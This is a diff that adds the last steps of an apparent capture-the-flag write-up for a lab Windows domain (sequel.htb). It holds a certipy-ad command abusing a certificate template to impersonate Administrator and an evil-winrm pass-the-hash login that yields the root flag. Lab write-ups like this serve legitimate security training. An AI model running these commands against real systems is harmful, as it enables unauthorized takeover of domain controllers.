@@ -192,3 +192,16 @@ Request to cert
 
     certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
 
+
+
+Evil-WinRM
+
+We can connect by `-H` flag, because we use hash, not password for connection to host.
+
+    evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+
+![image](https://github.com/user-attachments/assets/4ac637e0-b016-4317-9121-18e231def811)
+
+Get the root (system) flag!
+
+![image](https://github.com/user-attachments/assets/a9cd8d13-d6a4-44d1-a2e6-4864e4fc7762)
